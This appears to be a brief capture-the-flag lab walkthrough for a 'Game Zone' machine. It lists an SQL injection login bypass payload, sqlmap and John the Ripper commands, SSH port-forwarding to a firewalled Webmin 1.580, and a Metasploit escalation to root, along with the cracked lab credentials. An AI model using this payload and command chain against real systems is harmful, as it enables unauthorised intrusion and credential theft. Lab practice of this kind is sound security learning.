# GAME ZONE
```
IP = 10.10.11.154
```

+ Ran the initial nmap scan
+ Apache server running
+ SQLi vuln exists, enter ` ' OR 1=1 -- -` as username to log into portal.php
+ Intercept request from portal.php using burp and save it into a text file
+ Automated all types of SQLi for mysql using sqlmap
	`sqlmap -r request.txt --dbms=mysql --dump`
+ The dump from sqlmap gave password hash for user agent47
+ Cracked the hash using JohnTheRipper [videogamer124]
	`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256`
+ SSHed into the machine using agent47:videogamer124 credentials
+ Listed sockets using `ss -tunlp`
+ Created SSH reverse tunnel to access firewall restricted webserver
	`ssh -L 10000:localhost:10000 agent47@10.10.11.154`
+ Visit `http://localhost:10000/` to access webmin CMS, login with agent47:videogamer124
+ Found webmin version [1.580]
+ Searched for vulnerabilities using searchsploit for webmin 1.580
+ Found a metasploit module, loaded, configured and executed to gain root
